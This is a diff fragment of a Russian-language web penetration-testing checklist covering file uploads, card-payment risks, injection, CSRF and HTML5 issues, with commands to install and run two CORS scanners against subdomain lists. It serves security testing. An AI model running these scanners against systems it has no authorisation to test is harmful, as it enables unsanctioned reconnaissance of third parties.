+- [ ] Проверьте, что небезопасные имена файлов очищены
+- [ ] Проверьте, что загруженные файлы не доступны напрямую в корневом каталоге веб-сайта.
+- [ ] Проверьте, что загруженные файлы не обслуживаются на том же хосте/порту
+- [ ] Проверьте, что файлы и другие носители интегрированы со схемами аутентификации и авторизации.
+
+### Рискованная функциональность — оплата картой
+
+
+
+- [ ] Тестирование известных уязвимостей и проблем конфигурации веб-сервера и веб-приложения.
+- [ ] Проверка пароля по умолчанию или угадываемого пароля
+- [ ] Тестирование непроизводственных данных в реальной среде и наоборот
+- [ ] Тест на уязвимости к инъекциям
+- [ ] Тест на переполнение буфера
+- [ ] Тест на небезопасность криптографического хранилища
+- [ ] Тест на недостаточную защиту транспортного уровня
+- [ ] Тест на неправильную обработку ошибок
+- [ ] Тест на все уязвимости с оценкой CVSS v2 > 4.0
+- [ ] Тест на наличие проблем аутентификации и авторизации
+- [ ] Тест на CSRF
+
+### HTML5
+
+
+- [ ] Тестирование веб-сообщений
+- [ ] Тест на наличие SQL-инъекции в веб-хранилище
+- [ ] Проверить реализацию CORS
+
+```
+[https://github.com/chenjj/CORScanner](https://github.com/chenjj/CORScanner)
+
+pip install corscanner
+
+corscanner -i live_subdomains.txt -v -t 100
+
+---
+
+[https://github.com/Tanmay-N/CORS-Scanner](https://github.com/Tanmay-N/CORS-Scanner)
+
+go install github.com/Tanmay-N/CORS-Scanner@latest
+
+cat CORS-domain.txt | CORS-Scanner
+```
+
+- [ ] Проверить автономное веб-приложение
